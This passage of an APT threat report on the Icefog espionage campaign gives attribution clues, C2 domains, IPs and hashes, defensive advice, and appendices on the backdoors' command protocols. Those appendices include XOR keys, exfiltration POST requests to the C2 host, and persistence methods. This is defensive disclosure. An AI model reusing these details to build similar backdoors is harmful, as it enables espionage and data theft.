to test malware in different environments and evaluate its efficiency. That explains why the domain
used as C2 was abandoned - random victims had less value for the attackers.


Based on the more reliable analysis of the C&C servers used in the targeted attacks, spearphishing
examples and other data collected during our research, we believe that the primary targets of the
Icefog operations were in South Korea and Japan.

</section>


<footer>38</footer>

<header>Attribution</header>


<section>

 <heading> ►►ATTRIBUTION</heading>
  <heading>AT TACKER IPS</heading>

Based on the list of IPs used to monitor and control the infrastructure, we assume some of the threat
actors behind this operation are based in at least three countries:

  >>China (the largest number of connections)

  >>South Korea

  >>Japan

More information on attribution is available in our private report for governments. (Contact
intelreports@kaspersky.com)

</section>
<section>
    <heading>MALWARE ARTIFACTS</heading>

The “MSUC.DAT” type “2” backdoor has an ASCII string inside with the following content: “Yang.ZC
Wang.GS Zhan.QP Ma.J Li.X Hu.HXU”.


<figure></figure>

  <caption>Icefog Type “2” hardcoded names</caption>




<footer>39</footer>
                                                                                  
<header>ATTRIBUTION</header>



The Icefog Type “2” backdoor loader with MD5 “be043b0d1337f85cfd05f786eaf4f942”, found
on the C2 domain “infostaition.com” has the following debug path inside:


“C:\Users\yang.zc\Desktop\代码片调用程序 4\Release\UCCodePieceGo.pdb”


Note that “Yang.zc” appears in both strings. The string “代码片调用程序 4” translates to “Piece of
code calling 4” from Chinese.

</section>
<section>
    <heading>LANGUAGE USAGE</heading>

One of the C&C backend control scripts (control.aspx) has the page title “尖刀三号”, which means
“Dagger Three” in Simplified Chinese.


<figure></figure>

  <caption>“Dagger Three” - page title</caption>

The ASPX server-side scripts contain a number of messages and code comments in Chinese:


<figure></figure>

                                                                                           	
  

<footer>40</footer>

<header>Attribution</header>



One of the lateral movement tools used by the attackers has a Chinese name:


	windows版本号.txt.jpg - “windows version.txt.jpg”


Unauthenticated C&C login attempts to access the command-and-control user interface result in
redirects to ‘sohu.com’:


<figure></figure>

                                                                                            	
  

<box>Note: “sohu.com” is one of the most popular internet portals in China.</box>

</section>
<section>
  <heading>REGISTRATIONS</heading>

More information is available in our private report for governments.
(Contact intelreports@kaspersky.com)

</section>


<footer>41</footer>
                                                      
<header>MITIGATION INFORMATION</header>


<section>

 <heading>►►MITIGATION INFORMATION</heading>
        <heading>INDICATORS OF COMPROMISE (IOCS)</heading>


        <heading>C&C DOMAINS AND HOSTNAMES</heading>
<list>
 >>40yuan.8.100911.com

 >>625tongyi.com

 >>9-joy.net

 >>agorajpweb.com

 >>appst0re.net - SINKHOLED by Kaspersky Lab

 >>bigbombnews.com

 >>chinauswatch.net - SINKHOLED by Kaspersky Lab

 >>cloudsbit.com

 >>cnnpolicy.com

 >>dabolloth.com

 >>dancewall228.com

 >>dashope.net

 >>daxituzi.net

 >>defenseasia.net - SINKHOLED by Kaspersky Lab

 >>disneyland.website.iiswan.com

 >>dosaninfracore.com

 >>dotaplayers.com

 >>electk.net


<footer>42</footer>

<header>Mitigation Information</header>


 >>esdlin.com

 >>fruitloop.8.100911.com

 >>gamestar2.net

 >>gangstyleobs.com

 >>globalwebnews.net

 >>icefog.8.100911.com

 >>infostaition.com

 >>kakujae.com

 >>kansenshu.com

 >>kevinsw.net - SINKHOLED by Kaspersky Lab

 >>kechospital.com - SINKHOLED by Kaspersky Lab

 >>kimjeayun.com

 >>koreanmofee.com

 >>kreamnnd.com

 >>krentertainly.net

 >>lexdesign152.net

 >>mashuisi.net

 >>minihouse.website.iiswan.com

 >>msvistastar.com - SINKHOLED by Kaspersky Lab

 >>mudain.net

 >>namoon-tistory.com

 >>newsceekjp.com

 >>nk-kotii.com



<footer>43</footer>
                                                      
<header>MITIGATION INFORMATION</header>


 >>pasakosoft.net - SINKHOLED by Kaspersky Lab

 >>pinganw.org - SINKHOLED by Kaspersky Lab

 >>ppxxcc.org

 >>samyongonc.com

 >>securimalware.net - SINKHOLED by Kaspersky Lab

 >>sejonng.org

 >>sejoung.org

 >>setchon.com

 >>skynet121.net

 >>spekosoft.com - SINKHOLED by Kaspersky Lab

 >>starwings.net

 >>tokyoyan.net

 >>twittle.org

 >>unikorean.com - SINKHOLED by Kaspersky Lab

 >>war3players.com

 >>widestar.net

 >>womenewes.com

 >>yahoowebnews.com

 >>zhpedu.org
 </list>
</section>

<section>
    <heading>MALWARE PATHS ON DISK:</heading>
<list>
 >>%TEMP%\scvhost.exe

 >>%TEMP%\svohost.exe

 >>%TEMP%\msuc.dat

<footer>44</footer>

<header>Mitigation Information</header>


  >>%TEMP%\order.dat

  >>%TEMP%\cmd1.dat

  >>%TEMP%\tmpxor.dat

  >>%SYSTEMROOT%\msld.exe

  >>%SYSTEMROOT%\wdmaud.drv

  >>%PROGRAM FILES%\Internet Explorer\sxs.dll
</list>
</section>

<section>
    <heading>MUTEXES:</heading>
<list>
  >>my_horse_mutex_jd2_new

  >>my_horse_mutex_jd2_923

  >>myhorse_macfee

  >>horse_for360

  >>myhorsemutexjd3_wm_1226

  >>myhorsemutex

  >>myhorse_qianfu001

  >>myhorse_ie001

  >>myhorse_ie_001
</list>
</section>
<section>
    <heading>USER AGENT STRINGS (HTTP TRAFFIC):</heading>
<list>
  >>“MyAgent”

  >>“mydownload”
</list>
</section>
<section>
  <heading>E-MAILS ACCOUNTS:</heading>


Accounts used to send mail by the older “2011” Icefog:

<footer>45</footer>
                                                                        
<header>MITIGATION INFORMATION</header>

<list>
  >>harrypottercommand001@aol.com

  >>jd2command092@aol.com

  >>jd2clientsend@aol.com

  >>woshihero009@aol.com

  >>mrmylcmd009@aol.com

  >>defaultmail002@aol.com
  </list>
</section>

<section>
    <heading>IPs</heading>
<list>
  >>122.10.87.252

  >>113.10.136.228

  >>103.246.245.130
</list>
Note: due to shared hosting, blocking IPs for Icefog C2s can cause false positives. These IPs are
known to point to dedicated hosting servers.

</section>
<section>
  <heading>DETECTION NAMES BY KASPERSKY PRODUCTS FOR ICEFOG BACKDOORS AND
                             RELATED TOOLS</heading>
<list>
  >>Backdoor.ASP.Ace.ah

  >>Backdoor.Win32.Agent.dcjj

  >>Backdoor.Win32.Agent.dcwq

  >>Backdoor.Win32.Agent.dcww

  >>Backdoor.Win32.CMDer.ct

  >>Backdoor.Win32.Visel.ars

  >>Backdoor.Win32.Visel.arx

  >>Exploit.MSWord.CVE-2010-3333.cg

  >>Exploit.MSWord.CVE-2010-3333.ci

<footer>46</footer>

<header>Mitigation Information</header>


 >>Exploit.MSWord.CVE-2012-0158.ae

 >>Exploit.MSWord.CVE-2012-0158.az

 >>Exploit.MSWord.CVE-2012-0158.bu

 >>Exploit.MSWord.CVE-2012-0158.u

 >>Exploit.Win32.CVE-2012-0158.j

 >>Exploit.Win32.CVE-2012-0158.u

 >>Exploit.WinHLP.Agent.d

 >>Trojan-Downloader.Win32.Agent.ebie

 >>Trojan-Downloader.Win32.Agent.gxmp

 >>Trojan-Downloader.Win32.Agent.gzda

 >>Trojan-Downloader.Win32.Agent.gznn

 >>Trojan-Downloader.Win32.Agent.tenl

 >>Trojan-Downloader.Win32.Agent.vigx

 >>Trojan-Downloader.Win32.Agent.vkcs

 >>Trojan-Downloader.Win32.Agent.wcpy

 >>Trojan-Downloader.Win32.Agent.wqbl

 >>Trojan-Downloader.Win32.Agent.wqdv

 >>Trojan-Downloader.Win32.Agent.wqqz

 >>Trojan-Downloader.Win32.Agent.xrlh

 >>Trojan-Downloader.Win32.Agent.xsub

 >>Trojan-Downloader.Win32.Agent.xyqw

 >>Trojan-Downloader.Win32.Agent.yavh

 >>Trojan-Downloader.Win32.Agent.yium



<footer>47</footer>
                                     
<header>MITIGATION INFORMATION</header>


 >>Trojan-Dropper.Win32.Agent.gvfr

 >>Trojan-PSW.Win32.MailStealer.j

 >>Trojan-Spy.Win32.Agent.bwdf

 >>Trojan-Spy.Win32.Agent.bxeo

 >>Trojan.PHP.Agent.ax

 >>Trojan.Win32.Genome.ydxx

 >>Trojan.Win32.Icefog.*
</list>
</section>


<footer>48</footer>

<header>Conclusions</header>


<section>

  <heading>►►CONCLUSIONS</heading>
This paper describes “Icefog”, a small APT group which focuses on targets in South Korea and
Japan. The operation appears to have started in 2011 and increased in size and scope during each
year. Based on the victim profiles, the attackers appear to have an interest in the following sectors:
<list>
  >>Military

  >>Mass media and TV

  >>Shipbuilding and maritime operations

  >>Computers and software development

  >>Research companies

  >>Telecom operators

  >>Satellite operators
</list>
Despite their relative lack of complexity, the attackers have successfully compromised targets
belonging to these categories, with the largest number of victims being in South Korea.


The Icefog attackers have both Windows and Mac OS X backdoors at their disposal. The Mac OS
X backdoor currently remains largely undetected by security solutions and has managed to infect
several hundred victims worldwide.


The “hit and run” nature of this operation is one of the things that make it unusual. While in other
cases, victims remain infected for months or even years, and data is continuously exfiltrated, the
Icefog attackers appear to know very well what they need from the victims. Once the information is
obtained, the victim is abandoned.


During the past years, we observed a large increase in the number of APTs which are hitting pretty
much all types of victims and sectors. In turn, this is coupled with an increased focus on sensitive
information and corporate cyber-espionage.


In the future, we predict the number of small, focused APT-to-hire groups to grow, specializing in



<footer>49</footer>
                                                                                      
<header>CONCLUSIONS</header>



hit-and-run operations, a kind of “cyber mercenaries” of the modern world.


Recommendations on how to stay safe from such attacks (for both Windows and Mac OS X users):

  >>Update Java to the most recent version or, if you don’t use Java, uninstall it.

  >>Update Microsoft Windows and Microsoft Office to the latest versions.

  >>Update all other third party software, such as Adobe Reader.

  >>Be wary of clicking on links and opening attachments from unknown persons.

  >>Windows users can install Microsoft EMET 4.0, a toolkit designed to help prevent hackers
     from gaining access to your system.

So far, we haven’t observed the use of zero-day vulnerabilities by the Icefog group; to defend
against those, although patches don’t help, technologies such as AEP (Automatic Exploit
Prevention) and DefaultDeny can be quite effective.

</section>


<footer>50</footer>

<header>Appendix A</header>



<section>
 <heading>►►APPENDIX A</heading>
        <heading>MALWARE MD5S</heading>


              <heading>SPEARPHISHING DOCUMENTS</heading>
<table>              

                MD5                         FILENAME                 KASPERSKY NAME
 32e8d4b2f08aff883c8016b7ebd7c85b   1234567890.doc            Exploit.MSWord.CVE-2012-
                                                              0158.u
 219738275b9dfbef6be8b65473833e45   説明書.xls                   Exploit.MSWord.CVE-2012-
                                                              0158.az
 363bcf8bbf8ae7def65adcec0a755d45   n/a                       Exploit.MSWord.CVE-2012-
                                                              0158.u
 3ce3e49e0e31e69b2aabcb3d7569a63c   n/a                       Exploit.MSWord.CVE-2012-
                                                              0158.u
 c5f3d21cb19a4b2d03aa42e4bf43b79b   2345678901.doc            Exploit.MSWord.CVE-2012-
                                                              0158.u
 b1241cd7a0d7d58d1182badd0adba8ab   n/a                       Exploit.MSWord.CVE-2012-
                                                              0158.u
 7ec89be945add54aa67009dbc12a9260   keikaku-201302.xls        Exploit.OLE2.Multigeneric.
                                                              gen
 eb4579f08cd270e496c70ddcaa29dacb   “CS130116-2 BARILOCHE(    Exploit.OLE2.Multigeneric.
                                    ユニバーサル舞鶴 057) MSB.        gen
                                    XLS”
 5aaa057d3447a214e729276563d2f922   打ち合わせ議事録(130204).         Exploit.MSWord.CVE-2012-
                                    xls                       0158.az

</table>
</section>
<section>

                      <heading>DROPPERS</heading>
<table>                      

                                                     KASPERSKY
               MD5                  COMPILEDON                                C2
                                                       NAME
 8f816f4acc49f5ebba00d92437b42e85 2013-01-15      Trojan-            asdfghjk.host2.5y6.
                                  10:51:17        Downloader.        net/jd/upload.aspx
                                                  Win32.Agent.xpxr   (110.45.203.152 - KR)

</table>
</section>

<footer>51</footer>
                                                                              
<header>APPENDIX A</header>

<section>
                            <heading>BACKDOORS</heading>
<table>                            

                                                    KASPERSKY
               MD5                  COMPILEDON                                C2
                                                      NAME
f4ced221baf2a482e60baf374ab063be   2012-06-04    Trojan-             www.kechospital.
                                   15:22:58      Downloader.         com/jd/upload.
                                                 Win32.Agent.vkcs    aspx
3a6feab7eb90b87cf5a4e08bce2572e8   2012-06-04    Trojan-             www.kechospital.
                                   15:22:56      Downloader.         com/jd/upload.
                                                 Win32.Agent.vkcs    aspx
853096b7e1e4bdb9221875c30d9a15a0 2012-07-03      Trojan-             mail.kechospital.
                                 22:46:52        Downloader.         com/jd/upload.
                                                 Win32.Agent.wpuu    aspx
2a106c694660891e0950493e3eedc42d 2013-06-19      Trojan-             fruitloop.8.100911.
                                 09:43:17        Downloader.         com/news/upload.
                                                 Win32.Agent.yium    aspx
6d3d95137ef1ba5c6e15a4a95de8a546   2011-08-05    Trojan-Spy.Win32.   www.cloudsbit.
                                   13:44:30      Agent.bxeo          com/jd2web/
                                                                     upload.aspx
15a342cf2cc4fc5ae933d463f5d2196f   2011-08-05    Trojan-Spy.Win32.   www.cloudsbit.
                                   08:46:17      Agent.bxeo          com/ko/upload.
                                                                     aspx
acc57cc72a8d129703b4914c408a15a1   2011-03-16    Trojan-             www.cloudsbit.
                                   10:44:18      Downloader.         com/tt/upload.aspx
                                                 Win32.Agent.tenl
162b349be9c6d11c58cf163e211d891c   2011-07-22    Trojan-             www.cloudsbit.
                                   02:51:45      Downloader.         com/jian3/upload.
                                                 Win32.Agent.swbo    aspx
f7547f23bd2fd37b7d44e8617f629b49   2011-06-15    Trojan-             www.cloudsbit.
                                   02:24:07      Downloader.         com/hh/upload.
                                                 Win32.Agent.gxmp    aspx
c352c376968e8a1157fa425431776797   2013-01-16    Trojan-             www.9-joy.net/jd/
                                   16:51:32      Downloader.         upload.aspx
                                                 Win32.Agent.wqqz
31a530fea411455b8844fe019ffb66cd   2013-01-16    Trojan-             www.9-joy.net/jd/
                                   16:51:34      Downloader.         upload.aspx
                                                 Win32.Agent.wqqz
43678aa052ad677841bd2ef532ecd284   2013-06-21    Trojan-             minihouse.website.
                                   02:43:48      Downloader.         iiswan.com/upload/
                                                 Win32.Agent.gznn    upload.aspx
fa452f67c6bf8056b563690d61c4a4c6   2013-06-20    Backdoor.Win32.     www.kreamnnd.
                                   22:06:26      Agent.dcjj          com:5600
                                                                     (27.255.71.204)
b21635b1b1fce93ff917d9308d4835fb   2013-01-23    Trojan-             newsceekjp.com/
                                   08:30:51      Downloader.         jd/upload.aspx
                                                 Win32.Agent.xsry




<footer>52</footer>

<header>Appendix A</header>




 2d6a82fdb59e38d63027beac28dc2813   2012-04-12   Trojan-            www.setchon.com/
                                    18:07:41     Downloader.        jd/upload.aspx
                                                 Win32.Agent.vkcs
 beb9da03aff9386599625199a5a47b8d   2013-03-18   Trojan-            mudain.net/jd/
                                    02:17:49     Downloader.        upload.aspx
                                                 Win32.Agent.xyqw
 80405f5681f1e4f2de6e8c26ec20c14d   2012-01-17   Trojan-            pinganw.org/jd/
                                    05:55:18     Downloader.        upload.aspx
                                                 Win32.Agent.vigx
 2761c55bafa96d5814e847b665006e49   2012-07-17   Trojan-            199.192.154.124/
                                    18:16:19     Downloader.        jd/upload.aspx
                                                 Win32.Agent.wpzp


 566b175ab355e6313ba0ca98b0146d84   2011-09-16   Trojan-            www.unikorean.
                                    02:30:13     Downloader.        com/jd/upload.
                                                 Win32.Agent.tlod   aspx
 d421e0d74fa7035246c1ea51bd4d3114   2013-05-03   Trojan-            electk.net/jd/
                                    03:04:49     Downloader.        upload.aspx
                                                 Win32.Agent.yavh
 24751030c1fa40bd57988d4e6fe70117   2012-08-30   Trojan-            www.625tongyi.
                                    01:02:35     Downloader.        com/jd/upload.
                                                 Win32.Agent.wqqz   aspx
 392f5372ba3348ea1820df34c078f6c8   2013-01-08   Trojan-            www.dotaplayers.
                                    23:10:42     Downloader.        com/jd/upload.
                                                 Win32.Agent.xpsf   aspx
 fba7b9ffd08110e37d2bdf77c0d8b806   2013-02-04   Trojan-            40yuan.8.100911.
                                                 Downloader.        com/jd/upload.
                                                 Win32.Agent.xrlh   aspx
 0e2694aea9d3de122611d88e37ffc7f0   2011-06-19   Trojan.Win32.      www.chinauswatch.
                                    10:27:49     Icefog.d           net/test/upload.
                                                                    asp
 78d9ac9954516ac096992cf654caa1fc   2012-07-26   Trojan-            www.setchon.com/
                                    03:10:51     Downloader.        jd/upload.aspx
                                                 Win32.Agent.gzda
 387ae1e56fa48ec50a46394cc51acce7   2012-07-26   Trojan-            www.setchon.com/
                                    03:10:48     Downloader.        jd/upload.aspx
                                                 Win32.Agent.xsub
 cd85a9a05538e89190d519703c9a1327 2012-10-16     Trojan.Win32.      www.samyongonc.
                                  19:41:52       Icefog.b           com/jd/upload.
                                                                    aspx
 f46eb126668dfc843a05958e71936b01   2011-09-23   Trojan.Win32.      www.kevinsw.net/
                                    03:35:50     Icefog.b           jd2/upload.aspx

</table>
</section>

<footer>53</footer>
                                                                                         
<header>APPENDIX B</header>


<section>

  <heading>►►APPENDIX B</heading>
            <heading>MALWARE TECHNICAL ANALYSIS</heading>


                    <heading>ICEFOG TYPE “1” DESCRIPTION</heading>
<table>                    

                     MD5                             SIZE               COMPILEDON
 BF13CCB777F7175ECD567E757ABCB0E4              79’248            2013-06-19 12:43:17

</table>
</section>
<section>
    <heading>SUMMARY</heading>

The module is a non-packed Win32 PE DLL file compiled in Microsoft Visual C++ 8.0. The module
installs at %WinDir%\wdmaud.drv and is automatically loaded by explorer.exe on startup. This
technique is known as “DLL search order hijacking”, and abuses the fact that Windows Explorer will
load this file from its own directory first, instead of the Windows SYSTEM folder.


It communicates with the C&C server at ‘icefog.8.100911.com’ (211.42.249.39) and passes
collected information about victim, lets the operator download or upload files to and from the victim
machines, execute system commands on the infected machines as well as execute additional
malware components.
</section>

<section>
  <heading>DETAILED DESCRIPTION</heading>

After the DLL is loaded, it creates system mutex named “myhorse_macfee”. If such mutex already
exists, the module quits to avoid duplicate instances from running.


After that, it loads %WinDir%\wdmaud.drv (this DRV is loaded by explorer.exe on startup) and
calls exported mymainfunc of its own module that creates a new thread responsible for the
communication with C&C.


The spawned thread collects information about the system such as user names, machine names,
IP addresses, running processes, proxy settings, Windows versions, etc. It produces a report that



<footer>54</footer>

<header>Appendix B</header>



is later submitted to the C&C server. An example for such a report is shown below:
<list>
  Hostname: <SYSTEM NAME>
  IP: <SYSTEM LOCAL IP ADDRESS>
  Proxy: <LOCAL PROXY SERVER>
  User: <USERNAME>
  SystemDir: C:\WINDOWS\system32
  OS Language Version: <OS LANGUAGE ID>
  System Version: <OS VERSION>
  Process:
  ID: 4 (?)
  ID: 552 (\SystemRoot\System32\smss.exe)
  ...
  (List all running processes and their main executable file path)

</list>
This information is then written to the file at %TMP%\tmp.dat.


Then, it checks if the %TMP%\msuc.dat file exists. If it exists, the module creates a new thread
that will load the file contents into memory and pass execution flow to the first byte of the loaded
data in memory.


The contents of the tmp.dat is converted to wide char and XORed with key “*&~^%@0hh8979”.


Immediately after, it is sent via HTTP/1.1 POST request to ‘icefog.8.100911.com’ on port 80.


The full query string is the following:
<list>
  ‘/news/upload.aspx?filepath=info&filename=<HOSTNAME>_<HOSTIP>.jpg’.
</list>
Full HTTP headers:
<list>
  Host: icefog.8.100911.com
  User-Agent: MyAgent
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-us
  Content-Type: multipart/form-data’
  Accept-Encoding: gzip, deflate
</list>


<footer>55</footer>
                                                                                           
<header>APPENDIX B</header>


  Connection: Keep-Alive
  Cache-Control: no-cache
</section>
<section>
  <heading>CONTROL COMMANDS</heading>


The module attempts to get ‘icefog.8.100911.com/news/order/<HOSTNAME>_<HOSTIP>.jpg’
file with custom user agent “mydownload”. The response is saved to file %TMP% \order.dat


The content of order.dat is converted from widechar to multibyte string and is parsed for the following
command strings:
<list>
  >>cmd_

  >>upload_

  >>download_

  >>code_
</list>

If any of the commands above is found, the Trojan notifies the C&C that the command was received
by issuing the following POST request:
<list>
  Query string: ‘/news/upload.
  aspx?filepath=order&filename=<HOSTNAME>_<HOSTIP>.jpg’
</list>
Full HTTP/1.1 headers:
<list>
  Host: icefog.8.100911.com
  User agent: MyAgent
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-us
  Content-Type: multipart/form-data
  Accept-Encoding: gzip, deflate
  Connection: Keep-Alive
  Cache-Control: no-cache
  </list>
</section>



<footer>56</footer>

<header>Appendix B</header>

<section>
  <heading>COMMAND CMD_</heading>

The cmd command expect a payload string (<COMMAND>) following the “cmd_” prefix, so that the
full command syntax looks like this: cmd_<COMMAND>. It creates a new process with command
line C:\windows\system32\cmd.exe /c <COMMAND>


However, if <COMMAND> contains output redirection character “>”, the executed command line
will be as following:
<list>

C:\windows\system32\cmd.exe /c command > %TMP%\ cmd1.dat.
</list>

After the process has finished its stdout output is sent to the C&C via
<list>
  POST request to ‘/news/upload.
  aspx?filepath=result&filename=<HOSTNAME>_<HOSTIP>.jpg’


  Host: icefog.8.100911.com
  User-Agent: MyAgent
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-us
  Content-Type: multipart/form-data
  Accept-Encoding: gzip, deflate
  Connection: Keep-Alive
  Cache-Control: no-cache
</list>
The command-line output is converted to wide-char string and XORed using “*&~^%@0hh8979”
string as the key.
</section>

<section>
    <heading>COMMAND UPLOAD_</heading>

The command string format must be as following: upload_<FILEPATH>_<FILENAME>


It attempts to fetch icefog.8.100911.com/news/order/<FILENAME> using user agent mydownload
and saves the response to the local path specified in <FILEPATH>.




<footer>57</footer>
                                                                                   
<header>APPENDIX B</header>



After that it notifies the C&C by sending
<list>
  HTTP/1.1 POST request
  Query string: /news/upload.aspx?filepath=upload&filename=<FILENAME>
</list>
Full HTTP/1.1 headers:
<list>
  Host: icefog.8.100911.com
  User-Agent: MyAgent
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-us
  Content-Type: multipart/form-data’
  Accept-Encoding: gzip, deflate
  Connection: Keep-Alive’
  Cache-Control: no-cache
  </list>
</section>
<section>
  <heading>COMMAND DOWNLOAD_</heading>


Download command format must be

<list>
“download_<LOCALPATH>\<FILENAME>/<NAMEONSERVER>
</list>

The <LOCALPATH>\<FILENAME> file is opened and its content is prepared for uploading by
converting ANSI data to Unicode and XORing using key “*&~^%@0hh8979”. The result is saved to
%TMP%\tmpxor.dat’


The tmpxor.dat is uploaded via POST request to ‘icefog.8.100911.com’ at port 80.
<list>
  Query string: ‘/news/upload.aspx?filepath=download&filename=<HOSTNAME>_
  <HOSTIP>_<NAMEONSERVER>_<FILESIZE>.jpg’.
</list>
Full HTTP/1.1 headers:
<list>
  Host: icefog.8.100911.com
  User-Agent: MyAgent
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-us
  Content-Type: multipart/form-data’



<footer>58</footer>

<header>Appendix B</header>


  Accept-Encoding: gzip, deflate
  Connection: Keep-Alive
  Cache-Control: no-cache
  </list>
</section>
<section>
    <heading>COMMAND CODE_</heading>


The code command format must be code_<FILENAME>


A new thread is created that loads a local file, specified in <FILENAME>, to memory and passes
the execution to the first byte of the loaded data.
</section>

<section>
  <heading>NO COMMAND</heading>

If no known command is parsed out of the server response, the Trojan notifies the server about
being alive by issuing the following HTTP POST request:
<list>
  Query string: ‘/news/upload.
  aspx?filepath=ok&filename=<HOSTNAME>_<HOSTIP>.jpg’
  Host: icefog.8.100911.com
  User-Agent: MyAgent
  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  Accept-Language: en-us
  Content-Type: multipart/form-data
  Accept-Encoding: gzip, deflate
  Connection: Keep-Alive
  Cache-Control: no-cache.
</list>
After that it sleeps for 150 seconds and starts the command-processing loop again.

</section>


<footer>59</footer>
                                                                                        
<header>APPENDIX C</header>


<section>

  <heading>►►APPENDIX C</heading>
        <heading>THE ICEFOG-NG BOT DESCRIPTION</heading>


In addition to the web-based Icefog malware samples, we have come across a variant of the Icefog
bot which is based on a custom protocol working over a TCP session (port 5600 TCP) with its own
desktop application that serves as a command-and-control center.


For reference, we called it Icefog-NG (New Generation). We believe that the new generation
of Icefog was created to improve bot response and to increase the efficiency of operations. The
previous web-based version of the bot had significant time lag during operation (up to 40 seconds),
the new generation bot was created to solve the time lag issue.
<table>
                     MD5                              SIZE             COMPILEDON
 FA452F67C6BF8056B563690D61C4A4C6               86’016            2013-06-21 01:06:26
</table>
</section>

<section>
  <heading>SUMMARY</heading>


The module is a non-packed Win32 PE Executable file compiled in Microsoft Visual C++ 2005. It
is a backdoor that is capable of collecting system information, download and upload files, execute
commands.

</section>
<section>
  <heading>DETAILED DESCRIPTION</heading>

To enable automatic start during system boot, the malware adds and uses the following system
registry value:
  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load=”%TMP%\msloger.exe”


During start it checks if a file named “%TMP%\~AA.tmp” exists. If yes, it copies the file to %TMP%\
hwp.hwp. Next it kills processes named “hwp.exe” and then opens “hwp.hwp”. This is important
step during first malware run which opens a decoy .hwp document. This shows that the malware
was designed to be installed from .hwp documents containing exploits.



<footer>60</footer>

<header>Appendix C</header>



Then it copies “%TMP%\~Ab.tmp” to “%TMP%\msloger.exe”.


After that the malware registers on the C&C. To do that, the malware connects to www.kreamnnd.
com on port 5600 and sends a registration message

  [Total message size: DWORD]SX[HOSTID length:WORD][HOSTID][Host Info Data
  Size: DWORD][Host Info Data]

HOSTID is a string having system hostname and system IP joined by “_”: Hostname_IP.


The data is encrypted using XOR with key “&*^*@~^%9?i0h”. If the connection with C&C is lost the
bot can re-establish the session by sending

  [Total message size: DWORD]XT[Hostname length:WORD][HOSTNAME]_[IPADDR]
</section>
<section>
    <heading>CONTROL COMMANDS</heading>

After connecting to the C&C and sending the registration message the bot expects commands from
the server. These commands are described below.

</section>
<section>
    <heading>COMMAND CMD</heading>

This command is used to execute a command line. The message has the following format:

  [Total Message Size: DWORD]SC[COMMAND]

The bot checks if the COMMAND contains “sleep” then it sleeps for the specified time after “sleep”
substring.


Otherwise, a new cmd.exe processes is spawned to execute the COMMAND. If the command does
not contain “>” the output will be directed to %TMP%\cmd1.dat and the result will be sent to the
C&C automatically using the following format:

  [Total Message Size: DWORD][cmd1.dat data]

The %TMP%\cmd1.dat is deleted after the file is sent to the C&C.

</section>


<footer>61</footer>
                                                                                         
<header>APPENDIX C</header>
<section>

  <heading>COMMAND DOWNLOAD</heading>

This command is used to download a file from the victim machine. The message has the following
format:

  [Total Message Size: DWORD]DL[FILEPATH]

The server expects the bot to send a response message with the file size from victim bot	

  [Total Message Size: DWORD]OK[File Size: DWORD]

Then the server sends an acknowledgement message to the victim bot

  [Total Message Size: DWORD]OK

The bot encrypts the contents of the file and saves it to %TMP%\mstmpdata.dat. After that part it
sends mstmpdata.dat file split in chunks of 0x4ffc each (the last one may be shorter than 0x4ffc).
Here is the format of that message:

  [Total Message Size: DWORD][File data no longer than 0x4ffc]

The last message is repeated containing the next chunk of the file until end of file is reached.

</section>
<section>
  <heading>COMMAND UPLOAD</heading>

This command is used to upload a file from the C&C to the bot. The format of this command is the
following:

  [Total Message Size: DWORD]UP[File Size: DWORD][Data Chunk Size+Total
  Message Size field length, a hardcoded value of 0x5000: DWORD][File
  Name]


The server expect an OK message from the bot

  [Total Message Size: DWORD]OK

Then C&C sends the first part of the file.

  [Total Message Size: DWORD][File data no longer than 0x4ffc]

The server expects the OK message from the bot and transfers the next data chunk until the whole
file is uploaded
</section>


<footer>62</footer>

<header>Appendix C</header>

<section>
  <heading>COMMAND SLEEP</heading>

This command is used to suspend the C&C connection thread for 1 second.

  [Total Message Size: DWORD]SL

</section>


<footer>63</footer>
                                                                                       
<header>APPENDIX D</header>


<section>

  <heading>►►APPENDIX D</heading>
        <heading>THE MACFOG BOT DESCRIPTION</heading>


The MacOS X malware uses the type “1” protocol, just as the Windows version of Icefog. It has been
distributed on various Internet message boards and forums as an application called “Img2icns”.
There are two known malicious bundles, one contains the launcher and the backdoor modules, and
another contains the dropper and the backdoor modules.


Once the user executes the malicious application bundle, the backdoor is copied to the user’s
directory and the legitimate application is started as if there was no added malicious code.
</section>
<section>

    <heading>MACFOG — LAUNCHER MODULE</heading>
<table>
 Filename:                  launchd
 Location in the bundle: Img2icns.app/Contents/MacOS/launchd
 File size:                 23084 bytes
 Format:                    Mach-O Intel 64-bit executable
 MD5:                       336de9428650c46b64ff699ab4a441bb
</table>
The module is written in Objective C language and contains 4 classes: AppDelegate, UCHostInf,
UCNet, UCUpDownload. The latter three classes seem to be included from the backdoor’s source
code but not used.


All functionality is implemented in the function “AppDelegate - (void)
applicationDidFinishLaunching:(id)”.


The module was created from the same source code as the dropper but instead of installing the
backdoor module, it only executes the malicious payload and the decoy application:

  “%bundle path%/Contents/Resources/.launchd.app”
  “%bundle path%/Contents/Resources/.Img2icns.app” (the original “Img2icns”
  application, http://www.img2icnsapp.com/).
</section>


<footer>64</footer>

<header>Appendix D</header>

<section>
     <heading>MACFOG — DROPPER MODULE</heading>
<table>
 Filename:                  Img2icns
 Location in the bundle: Img2icns.app/Contents/MacOS/Img2icns
 File size:                 23236 bytes
 Format:                    Mach-O Intel 64-bit executable
 MD5:                       9f422bb6c00bb46fbfa3918ae3e9447a
</table>

The module is written in Objective C language and contains 4 classes: AppDelegate, UCHostInf,
UCNet, UCUpDownload. The latter three classes seem to be included from the backdoor’s source
code but not used.


All functionality is implemented in the function “AppDelegate - (void)
applicationDidFinishLaunching:(id)”.


The module copies its malicious bundle from “Contents/Resources/.launchd.app” to user’s home
directory “/Users/%username%” and launches it, effectively activating the backdoor. Then, it
launches the legitimate part of the bundle, “Contents/Resources/Img2icns.app” that is the original
“Img2icns” application (http://www.img2icnsapp.com/).

</section>
<section>
    <heading>MACFOG — BACKDOOR MODULE</heading>
<table>
 Filename:                          launchd
 Location in the bundle:            Img2icns.app/Contents/Resources/.launchd.app/Contents/
                                    MacOS/launchd
 Location on disk:                  /Users/%user name%/.launchd.app/Contents/MacOS/launchd
 File size:                         32748 bytes
 Format:                            Mach-O Intel 64-bit executable
